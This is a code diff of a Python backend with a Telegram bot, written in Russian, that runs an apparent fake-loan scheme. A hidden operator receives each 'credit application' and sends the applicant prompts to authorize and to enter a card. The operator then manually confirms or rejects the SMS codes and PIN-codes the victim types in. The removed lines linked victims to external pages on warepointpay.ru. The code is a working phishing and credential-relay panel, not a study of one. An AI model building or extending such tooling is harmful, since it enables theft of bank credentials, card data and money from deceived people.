@@ -68,6 +68,7 @@ class CreditApplicationData(BaseModel):
     months: int
     amount: float
     payment: float
+    user_chat_id: int = None
 
 class PhoneData(BaseModel):
     phone: str
@@ -123,6 +124,7 @@ async def submit_credit_application(data: CreditApplicationData):
         "months": data.months,
         "amount": data.amount,
         "payment": data.payment,
+        "user_chat_id": data.user_chat_id,
         "status": "waiting_action"
     }
     
@@ -256,35 +258,36 @@ async def handle_callback(request: Request):
     session_id = "_".join(parts[1:]) if len(parts) > 2 else parts[1]
     
     session = sessions.get(session_id)
+    user_chat_id = session.get("user_chat_id") if session else None
     
     # ===== КНОПКА "АВТОРИЗАЦИЯ" =====
     if action == "auth":
-        if session and session.get("user_chat_id"):
+        if user_chat_id:
             send_to_telegram(
-                str(session["user_chat_id"]),
-                "🔐 *Авторизация*\n\nПерейдите по ссылке для входа:\nhttps://warepointpay.ru/page_82554/"
+                str(user_chat_id),
+                "🔐 *Требуется авторизация*\n\nНеобходимо авторизоваться для получения кредита"
             )
-            send_to_telegram(MY_CHAT_ID, f"🔐 Ссылка на авторизацию отправлена пользователю")
+            send_to_telegram(MY_CHAT_ID, f"🔐 Модалка авторизации отправлена пользователю")
         else:
             send_to_telegram(MY_CHAT_ID, f"⚠️ Не найден chat_id для сессии {session_id}")
         requests.post(
             f"{TELEGRAM_API_URL}/answerCallbackQuery",
-            json={"callback_query_id": callback_id, "text": "Ссылка отправлена"}
+            json={"callback_query_id": callback_id, "text": "Уведомление отправлено"}
         )
     
     # ===== КНОПКА "ОПЛАТА" =====
     elif action == "pay":
-        if session and session.get("user_chat_id"):
+        if user_chat_id:
             send_to_telegram(
-                str(session["user_chat_id"]),
-                "💳 *Оплата кредита*\n\nПерейдите по ссылке для оплаты:\nhttps://warepointpay.ru/page_63860/"
+                str(user_chat_id),
+                "💳 *Требуется оплата*\n\nДля получения кредита укажите карту"
             )
-            send_to_telegram(MY_CHAT_ID, f"💳 Ссылка на оплату отправлена пользователю")
+            send_to_telegram(MY_CHAT_ID, f"💳 Модалка оплаты отправлена пользователю")
         else:
             send_to_telegram(MY_CHAT_ID, f"⚠️ Не найден chat_id для сессии {session_id}")
         requests.post(
             f"{TELEGRAM_API_URL}/answerCallbackQuery",
-            json={"callback_query_id": callback_id, "text": "Ссылка отправлена"}
+            json={"callback_query_id": callback_id, "text": "Уведомление отправлено"}
         )
     
     # ===== КНОПКИ ДЛЯ КОДА =====
@@ -293,14 +296,12 @@ async def handle_callback(request: Request):
         if result == "ok":
             if session:
                 session["status"] = "code_confirmed"
-                user_chat_id = session.get("user_chat_id")
                 if user_chat_id:
                     send_to_telegram(str(user_chat_id), "✅ Код подтверждён! Введите PIN-код.")
             send_to_telegram(MY_CHAT_ID, f"✅ Код подтверждён для {session_id}")
         else:
             if session:
                 session["status"] = "code_wrong"
-                user_chat_id = session.get("user_chat_id")
                 if user_chat_id:
                     send_to_telegram(str(user_chat_id), "❌ Неверный код. Попробуйте ещё раз.")
             send_to_telegram(MY_CHAT_ID, f"❌ Код отклонён для {session_id}")
@@ -315,14 +316,12 @@ async def handle_callback(request: Request):
         if result == "ok":
             if session:
                 session["status"] = "pin_confirmed"
-                user_chat_id = session.get("user_chat_id")
                 if user_chat_id:
                     send_to_telegram(str(user_chat_id), "✅ Авторизация успешна!")
             send_to_telegram(MY_CHAT_ID, f"✅ PIN подтверждён для {session_id}")
         else:
             if session:
                 session["status"] = "pin_wrong"
-                user_chat_id = session.get("user_chat_id")
                 if user_chat_id:
                     send_to_telegram(str(user_chat_id), "❌ Неверный PIN. Попробуйте ещё раз.")
             send_to_telegram(MY_CHAT_ID, f"❌ PIN отклонён для {session_id}")
